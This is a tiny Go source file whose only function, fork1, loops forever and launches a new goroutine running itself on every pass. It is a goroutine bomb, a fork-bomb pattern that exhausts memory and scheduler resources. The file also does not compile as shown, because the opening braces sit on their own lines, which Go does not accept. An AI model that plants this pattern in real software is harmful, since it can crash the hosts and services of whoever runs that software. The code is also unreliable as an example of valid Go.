package fork1

func fork1() 
{
	for 
  {
		go fork1()
	}
}
